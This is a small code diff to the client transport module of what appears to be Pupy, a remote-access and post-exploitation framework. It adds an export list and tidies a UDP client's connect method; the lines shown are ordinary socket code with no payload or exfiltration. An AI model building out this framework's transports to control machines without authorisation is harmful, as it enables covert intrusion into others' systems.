@@ -1,5 +1,14 @@
 # -*- coding: utf-8 -*-
 
+__all__ = (
+    'PupyClient',
+    'PupyTCPClient',
+    'PupyUDPClient',
+    'PupyProxifiedTCPClient',
+    'PupySSLClient',
+    'PupyProxifiedSSLClient',
+)
+
 import socket
 import ssl
 import tempfile
@@ -185,16 +194,22 @@ class PupyUDPClient(PupyClient):
     def __init__(self, family = socket.AF_UNSPEC, socktype = socket.SOCK_DGRAM, timeout=3):
         self.sock=None
         super(PupyUDPClient, self).__init__()
-        self.family=family
-        self.socktype=socktype
-        self.timeout=timeout
+        self.family = family
+        self.socktype = socktype
+        self.timeout = timeout
 
     def connect(self, host, port):
-        self.host=host
-        self.port=port
-        family, socktype, proto, _, sockaddr = socket.getaddrinfo(host, port, self.family, self.socktype)[0]
+        family, socktype, proto, _, sockaddr = socket.getaddrinfo(
+            host, port, self.family, self.socktype
+        )[0]
+
         s = socket.socket(family, socktype, proto)
         s.settimeout(self.timeout)
         s.connect(sockaddr)
-        self.sock=s
+        s.setblocking(0)
+
+        self.sock = s
+        self.host = host
+        self.port = port
+
         return s, (host, port)
